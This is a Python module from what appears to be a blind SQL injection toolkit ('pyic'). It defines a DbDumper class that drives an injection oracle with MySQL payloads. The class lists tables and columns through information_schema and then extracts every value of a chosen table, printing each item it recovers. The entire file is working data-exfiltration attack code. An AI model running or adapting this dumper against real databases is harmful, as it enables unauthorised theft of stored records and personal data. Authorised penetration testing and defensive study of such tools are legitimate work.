from pyic.blind_string_finder import StringFinder
from pyic.payloads import MysqlPayloads


class DbDumper:
    """
    Database dumper.
    This class use a string finder to dump the content of a database.

    Can dump a mysql database via the read of the information_schema tables.
    The String finder is use to get the content of the tables

    """
    def __init__(self, string_finder: StringFinder, payloads=MysqlPayloads()):
        self.payloads = payloads
        self.sf = string_finder

    def dump(self, table):
        """
        Dump a table
        :param table: the table name, do not encode the value
        :return:
        """
        columns = self.columns(table)
        print('[+] columns of {} : {}'.format(table, columns))
        for column in columns:
            print('[+] values for column {} : {}'.format(column, self.content(table, column)))

    def tables(self):
        """
        list the tables of the current databases
        :return:
        """
        return self.list_query('table_name', 'information_schema.tables')

    def columns(self, table_value):
        """
        Dump the columns of a table
        :param table_value: table name with quotes or encoded if needed
        :return: list of the columns of this table
        """
        return self.list_query('column_name', 'information_schema.columns',
                               self.payloads.where('table_name', "{}".format(table_value)))

    def content(self, table, column):
        """
        Dump a table
        :param table: table name
        :param column: column
        :return: list of the values of the column on this table
        """
        return self.list_query(column, table)

    def list_query(self, column, table, where=''):
        """
        Dump a query with a unique column and many lines.
        :param column: column to read, the query must have a unique field
        :param table: table name
        :param where: where clause, with the 'WHERE' keyword
        :return: list of the results of the query
        """
        items_ = []
        i = 0
        while True:
            item = self.sf.read_string(self.payloads.one_line_query(column, table, where, i))
            if item is None or item == '':
                break
            if i >= 1 and items_[i - 1] == item:
                print('[-] It seems that we find the same item many times, we stop')
                break
            print('[+] read value : {}'.format(item))
            items_.append(item)
            i += 1
        return items_
